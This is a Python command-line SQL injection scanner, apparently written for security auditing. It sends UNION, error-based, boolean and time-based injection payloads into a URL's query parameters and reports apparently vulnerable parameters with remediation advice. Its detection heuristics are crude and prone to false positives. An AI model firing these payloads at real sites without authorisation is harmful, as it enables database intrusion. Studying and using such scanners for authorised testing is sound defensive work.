#!/usr/bin/env python3
"""
💉 SQL Injection Tester

Automated SQL injection detection and exploitation tool for security auditing.
Tests for various SQL injection types: UNION-based, Error-based, Boolean-based, Time-based.

Author: SOC Analyst
Version: 1.0.0
License: MIT
"""

import argparse
import json
import logging
import re
import sys
import time
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from urllib.request import urlopen, Request
from urllib.error import HTTPError

import colorama
from colorama import Fore, Style

colorama.init()


@dataclass
class SQLInjectionTest:
    """SQL injection test result"""
    id: str
    url: str
    parameter: str
    injection_type: str
    payload: str
    vulnerable: bool
    database_type: str = ""
    data_extracted: str = ""
    error_message: str = ""
    remediation: str = ""
    
    def to_dict(self) -> dict:
        return {
            "id": self.id,
            "url": self.url,
            "parameter": self.parameter,
            "injection_type": self.injection_type,
            "payload": self.payload,
            "vulnerable": self.vulnerable,
            "database_type": self.database_type,
            "data_extracted": self.data_extracted,
            "error_message": self.error_message,
            "remediation": self.remediation
        }


@dataclass
class SQLInjectionResult:
    """Complete SQL injection test result"""
    target: str
    scan_start: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    scan_end: str = ""
    duration: float = 0.0
    tests: List[SQLInjectionTest] = field(default_factory=list)
    vulnerable_parameters: List[str] = field(default_factory=list)
    
    def to_dict(self) -> dict:
        return {
            "target": self.target,
            "scan_start": self.scan_start,
            "scan_end": self.scan_end,
            "duration": f"{self.duration:.2f}s",
            "total_tests": len(self.tests),
            "vulnerable_parameters": self.vulnerable_parameters,
            "vulnerabilities": [t.to_dict() for t in self.tests if t.vulnerable]
        }


# SQL Injection payloads by type
UNION_PAYLOADS = [
    "' UNION SELECT 1--",
    "' UNION SELECT 1,2--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT 1,2,3,4--",
    "' UNION SELECT 1,2,3,4,5--",
    "' UNION SELECT 1,2,3,4,5,6--",
    "' UNION ALL SELECT 1--",
    "' UNION ALL SELECT 1,2--",
    "' UNION ALL SELECT 1,2,3--",
    "' UNION ALL SELECT 1,2,3,4--",
    "') UNION SELECT 1--",
    "') UNION SELECT 1,2--",
    "') UNION SELECT 1,2,3--",
    "')) UNION SELECT 1--",
]

ERROR_BASED_PAYLOADS = [
    "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))a FROM INFORMATION_SCHEMA.COLUMNS GROUP BY a)x)--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,VERSION(),0x7e),1)--",
    "' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--",
    "1' OR 1=1--",
]

BOOLEAN_PAYLOADS = [
    "' AND 1=1--",
    "' AND 1=2--",
    "1' OR '1'='1",
    "1' OR '1'='2",
    "' OR '1'='1",
    "' OR '1'='2",
]

TIME_PAYLOADS = [
    "' AND SLEEP(5)--",
    "' AND BENCHMARK(10000000,SHA1('test'))--",
    "' OR SLEEP(5)--",
    "1' OR SLEEP(5)--",
]


class SQLInjectionTester:
    """SQL Injection Testing Tool"""
    
    def __init__(self, target: str, verbose: bool = False):
        self.target = target
        self.verbose = verbose
        self.logger = self._setup_logging()
        self.result = SQLInjectionResult(target=target)
        
    def _setup_logging(self) -> logging.Logger:
        """Configure logging"""
        logger = logging.getLogger("sql_injection_tester")
        logger.setLevel(logging.DEBUG if self.verbose else logging.INFO)
        
        if not logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            logger.addHandler(handler)
        
        return logger
    
    def _make_request(self, url: str, timeout: int = 10) -> Tuple[Optional[str], int, float]:
        """Make HTTP request and return content, status, response time"""
        try:
            start_time = time.time()
            req = Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            with urlopen(req, timeout=timeout) as response:
                content = response.read().decode('utf-8', errors='ignore')
                status = response.status
                duration = time.time() - start_time
                return content, status, duration
        except HTTPError as e:
            return None, e.code, 0
        except Exception as e:
            self.logger.debug(f"Request failed: {e}")
            return None, 0, 0
    
    def _extract_params(self, url: str) -> Dict[str, str]:
        """Extract parameters from URL"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        return {k: v[0] if len(v) == 1 else v for k, v in params.items()}
    
    def _detect_database_type(self, content: str) -> str:
        """Detect database type from error messages"""
        if 'MySQL' in content or 'mysql' in content:
            return 'MySQL'
        elif 'PostgreSQL' in content or 'psql' in content:
            return 'PostgreSQL'
        elif 'Microsoft SQL Server' in content or 'SQLServer' in content:
            return 'SQL Server'
        elif 'ORA-' in content:
            return 'Oracle'
        elif 'SQLite' in content:
            return 'SQLite'
        return 'Unknown'
    
    def _test_union_injection(self, url: str, param: str, 
                             base_content: str) -> Optional[SQLInjectionTest]:
        """Test for UNION-based SQL injection"""
        params = self._extract_params(url)
        original_value = params.get(param, '')
        
        for payload in UNION_PAYLOADS[:8]:
            test_value = original_value + payload if original_value else payload
            params[param] = test_value
            
            test_url = url.split('?')[0] + '?' + urlencode(params)
            content, status, _ = self._make_request(test_url)
            
            if content and content != base_content:
                # Check for successful UNION
                if re.search(r'\d+', content):
                    return SQLInjectionTest(
                        id=f"UNION-{param.upper()}-{datetime.now().strftime('%H%M%S')}",
                        url=url,
                        parameter=param,
                        injection_type="UNION-based",
                        payload=payload,
                        vulnerable=True,
                        database_type=self._detect_database_type(content),
                        data_extracted="Data may be extractable via UNION",
                        remediation="Use parameterized queries. Validate and sanitize input."
                    )
        
        return None
    
    def _test_error_injection(self, url: str, param: str,
                            base_content: str) -> Optional[SQLInjectionTest]:
        """Test for error-based SQL injection"""
        params = self._extract_params(url)
        original_value = params.get(param, '')
        
        for payload in ERROR_BASED_PAYLOADS[:4]:
            test_value = original_value + payload if original_value else payload
            params[param] = test_value
            
            test_url = url.split('?')[0] + '?' + urlencode(params)
            content, status, _ = self._make_request(test_url)
            
            if content:
                # Look for database error messages
                error_patterns = [
                    (r'you have an error in your sql syntax', 'MySQL Syntax Error'),
                    (r'ORA-\\d+', 'Oracle Error'),
                    (r'conversion failed when converting', 'SQL Server Error'),
                    (r'psycopg2', 'PostgreSQL Error'),
                ]
                
                for pattern, error_name in error_patterns:
                    if re.search(pattern, content, re.IGNORECASE):
                        return SQLInjectionTest(
                            id=f"ERROR-{param.upper()}-{datetime.now().strftime('%H%M%S')}",
                            url=url,
                            parameter=param,
                            injection_type="Error-based",
                            payload=payload,
                            vulnerable=True,
                            database_type=error_name,
                            error_message=error_name,
                            remediation="Disable detailed error messages in production. Use parameterized queries."
                        )
        
        return None
    
    def _test_boolean_injection(self, url: str, param: str,
                               base_content: str) -> Optional[SQLInjectionTest]:
        """Test for boolean-based SQL injection"""
        params = self._extract_params(url)
        original_value = params.get(param, '')
        
        # Test true condition
        true_payload = original_value + " AND 1=1" if original_value else "' AND '1'='1"
        true_params = params.copy()
        true_params[param] = true_payload
        
        true_url = url.split('?')[0] + '?' + urlencode(true_params)
        true_content, _, _ = self._make_request(true_url)
        
        # Test false condition
        false_payload = original_value + " AND 1=2" if original_value else "' AND '1'='2"
        false_params = params.copy()
        false_params[param] = false_payload
        
        false_url = url.split('?')[0] + '?' + urlencode(false_params)
        false_content, _, _ = self._make_request(false_url)
        
        # Compare responses
        if true_content and false_content:
            # If responses are different, likely vulnerable
            if len(true_content) != len(false_content) or true_content != false_content:
                return SQLInjectionTest(
                    id=f"BOOL-{param.upper()}-{datetime.now().strftime('%H%M%S')}",
                    url=url,
                    parameter=param,
                    injection_type="Boolean-based",
                    payload=true_payload,
                    vulnerable=True,
                    remediation="Use parameterized queries. Implement input validation."
                )
        
        return None
    
    def _test_time_injection(self, url: str, param: str) -> Optional[SQLInjectionTest]:
        """Test for time-based SQL injection"""
        params = self._extract_params(url)
        original_value = params.get(param, '')
        
        # Normal request time
        normal_url = url.split('?')[0] + '?' + urlencode(params)
        _, _, normal_time = self._make_request(normal_url)
        
        for payload in TIME_PAYLOADS[:3]:
            test_value = original_value + payload if original_value else payload
            test_params = params.copy()
            test_params[param] = test_value
            
            test_url = url.split('?')[0] + '?' + urlencode(test_params)
            _, _, test_time = self._make_request(test_url)
            
            # If response time is significantly longer, likely vulnerable
            if test_time > normal_time + 4:  # 4+ seconds difference
                return SQLInjectionTest(
                    id=f"TIME-{param.upper()}-{datetime.now().strftime('%H%M%S')}",
                    url=url,
                    parameter=param,
                    injection_type="Time-based (Blind)",
                    payload=payload,
                    vulnerable=True,
                    data_extracted=f"Response delay: {test_time - normal_time:.2f}s",
                    remediation="Use parameterized queries. Do not rely on timing for authentication."
                )
        
        return None
    
    def test_parameter(self, url: str, param: str) -> List[SQLInjectionTest]:
        """Test a single parameter for SQL injection"""
        params = self._extract_params(url)
        base_url = url.split('?')[0] + '?' + urlencode(params)
        base_content, _, _ = self._make_request(base_url)
        
        tests = []
        
        # Run all tests
        union_test = self._test_union_injection(url, param, base_content)
        if union_test:
            tests.append(union_test)
        
        error_test = self._test_error_injection(url, param, base_content)
        if error_test:
            tests.append(error_test)
        
        bool_test = self._test_boolean_injection(url, param, base_content)
        if bool_test:
            tests.append(bool_test)
        
        time_test = self._test_time_injection(url, param)
        if time_test:
            tests.append(time_test)
        
        return tests
    
    def scan(self, urls: List[str] = None) -> SQLInjectionResult:
        """Perform SQL injection scan"""
        start_time = time.time()
        
        self.logger.info(f"Starting SQL injection tests for {self.target}")
        
        # Normalize target
        if not urlparse(self.target).query:
            # No query params, might be a form
            target_url = self.target
        else:
            target_url = self.target
        
        # Get URLs to test
        if urls:
            urls_to_test = urls
        else:
            urls_to_test = [target_url]
        
        all_tests = []
        vulnerable_params = set()
        
        for url in urls_to_test:
            params = self._extract_params(url)
            
            if not params:
                continue
            
            for param in params:
                if self.verbose:
                    self.logger.info(f"Testing parameter: {param}")
                
                tests = self.test_parameter(url, param)
                all_tests.extend(tests)
                
                for test in tests:
                    if test.vulnerable:
                        vulnerable_params.add(f"{url}:{param}")
                        self.logger.warning(
                            f"{Fore.RED}VULNERABLE:{Style.RESET_ALL} "
                            f"{param} - {test.injection_type}"
                        )
        
        end_time = time.time()
        self.result.scan_end = datetime.utcnow().isoformat()
        self.result.duration = end_time - start_time
        self.result.tests = all_tests
        self.result.vulnerable_parameters = list(vulnerable_params)
        
        self.logger.info(
            f"Scan completed in {self.result.duration:.2f}s. "
            f"Found {len(vulnerable_params)} vulnerable parameters."
        )
        
        return self.result
    
    def print_results(self):
        """Print test results"""
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}SQL INJECTION TEST RESULTS{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
        
        print(f"Target: {self.target}")
        print(f"Duration: {self.result.duration:.2f}s")
        print(f"Total Tests: {len(self.result.tests)}")
        print(f"Vulnerable Parameters: {len(self.result.vulnerable_parameters)}\n")
        
        vulnerable = [t for t in self.result.tests if t.vulnerable]
        
        if vulnerable:
            print(f"{Fore.RED}Vulnerable Endpoints:{Style.RESET_ALL}\n")
            
            for test in vulnerable:
                print(f"{Fore.RED}[VULNERABLE]{Style.RESET_ALL} {test.injection_type}")
                print(f"  URL: {test.url}")
                print(f"  Parameter: {test.parameter}")
                print(f"  Payload: {test.payload}")
                if test.database_type:
                    print(f"  Database: {test.database_type}")
                if test.data_extracted:
                    print(f"  Evidence: {test.data_extracted}")
                print(f"  Remediation: {test.remediation}\n")
        else:
            print(f"{Fore.GREEN}No SQL injection vulnerabilities detected.{Style.RESET_ALL}\n")
    
    def save_results(self, filename: str = "sql_injection_results.json"):
        """Save results to JSON"""
        with open(filename, 'w') as f:
            json.dump(self.result.to_dict(), f, indent=2)
        self.logger.info(f"Results saved to {filename}")


def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description="SQL Injection Tester",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u "http://localhost/api/users?id=1"
  %(prog)s -u "http://localhost/search.php?q=test" --test-all
  %(prog)s -u "http://localhost" -v
  %(prog)s -u "http://localhost" -o results.json
        """
    )
    
    parser.add_argument('-u', '--url', required=True,
                       help="URL to test for SQL injection")
    parser.add_argument('-o', '--output', default="sql_injection_results.json",
                       help="Output JSON file")
    parser.add_argument('--test-all', action='store_true',
                       help="Test all injection types (slower)")
    parser.add_argument('-v', '--verbose', action='store_true',
                       help="Enable verbose output")
    parser.add_argument('--no-color', action='store_true',
                       help="Disable colored output")
    
    args = parser.parse_args()
    
    if args.no_color:
        colorama.deinit()
    
    tester = SQLInjectionTester(target=args.url, verbose=args.verbose)
    result = tester.scan()
    
    tester.print_results()
    tester.save_results(args.output)
    
    return 0


if __name__ == "__main__":
    sys.exit(main())
